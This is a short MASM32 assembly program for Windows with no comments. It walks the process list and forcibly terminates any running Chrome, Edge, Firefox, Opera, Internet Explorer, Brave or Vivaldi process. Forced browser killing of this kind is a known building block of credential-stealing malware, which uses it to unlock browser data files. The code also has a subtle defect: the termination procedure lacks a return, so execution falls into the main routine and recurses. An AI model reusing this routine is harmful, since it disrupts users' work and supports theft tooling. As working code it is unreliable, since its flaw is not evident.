.386    
.model flat,stdcall 
option casemap:none

include \masm32\include\windows.inc   
include \masm32\include\user32.inc
include \masm32\include\shell32.inc
include \masm32\include\kernel32.inc

includelib \masm32\lib\user32.lib 
includelib \masm32\lib\kernel32.lib  
includelib \masm32\lib\shell32.lib
Process32First PROTO :DWORD,:DWORD
Process32Next PROTO :DWORD,:DWORD
.data
hSnapshot HANDLE ?
hTerminate HANDLE ?
Chrome db "chrome.exe",0
Edge db "msedge.exe",0
Firefox db "firefox.exe",0
Opera db "opera.exe",0
Iexplore db "iexplore.exe",0
Brave db "brave.exe",0
Vivaldi db "vivaldi.exe",0
PE32 PROCESSENTRY32 <>

.code
Strcmp proc
push ebp
mov ebp,esp
mov esi,[ebp + 8]
mov edi,[ebp + 12]
xor ecx,ecx
xor eax,eax
LOOPP:
mov ah, BYTE PTR [esi + ecx]
mov al, BYTE PTR [edi + ecx]
cmp ah,al
jnz Fail
cmp ah,0
jnz L2
cmp al,0
jnz L2
jmp Sucess
L2:
inc ecx
jmp LOOPP
Sucess:
mov eax,0
jmp OU
Fail:
mov eax,1
OU:
mov esp,ebp
pop ebp
ret
Strcmp endp
Terminate proc
invoke CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
mov hSnapshot, eax
cmp hSnapshot,INVALID_HANDLE_VALUE
jz EXITT
 mov PE32.dwSize , sizeof PROCESSENTRY32
 invoke Process32First, hSnapshot, addr PE32 
 cmp eax, 0
 jz EXITT
WHILEE:									;Whilehere
 push offset PE32.szExeFile 
 push offset Chrome
 call Strcmp 
 pop ecx
 pop ecx
 cmp eax,0
 jz T1
 push offset PE32.szExeFile 
 push offset Firefox
 call Strcmp 
 pop ecx
 pop ecx
 cmp eax,0
 jz T1

 push offset PE32.szExeFile 
 push offset Opera
 call Strcmp 
 pop ecx
 pop ecx
 cmp eax,0
 jz T1

 push offset PE32.szExeFile 
 push offset Iexplore
 call Strcmp 
 pop ecx
 pop ecx
 cmp eax,0
 jz T1

 push offset PE32.szExeFile 
 push offset Brave
 call Strcmp 
 pop ecx
 pop ecx
 cmp eax,0
 jz T1

 push offset PE32.szExeFile 
 push offset Vivaldi
 call Strcmp 
 pop ecx
 pop ecx
 cmp eax,0
 jz T1

 push offset PE32.szExeFile 
 push offset Edge
 call Strcmp 
 pop ecx
 pop ecx
 cmp eax,0
 jnz T2

 T1:
 invoke OpenProcess, PROCESS_TERMINATE, FALSE, PE32.th32ProcessID
 mov hTerminate,eax
 invoke TerminateProcess, hTerminate, 0
 T2:
 invoke Process32Next, hSnapshot, addr PE32 
 cmp eax, 0
 jz EXITT
jmp WHILEE									;Whilehere


EXITT:
Terminate endp

main proc
call Terminate
invoke ExitProcess,0
main endp
end main